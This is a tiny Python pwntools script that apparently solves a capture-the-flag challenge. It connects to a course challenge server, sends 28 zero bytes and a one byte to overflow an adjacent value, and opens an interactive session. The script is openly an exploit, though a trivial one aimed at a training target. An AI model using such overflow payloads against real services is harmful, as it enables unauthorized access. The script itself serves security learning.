from pwn import *

ip = "chals.syssec.dk"
port = 13333

# print(type(b"0000s0000000000000000000000001"))


with remote(ip, port, level="debug") as remote:
    remote.sendline(bytes([0 for _ in range(28)] + [1]))
    remote.interactive()
# 00000000000000000000000000001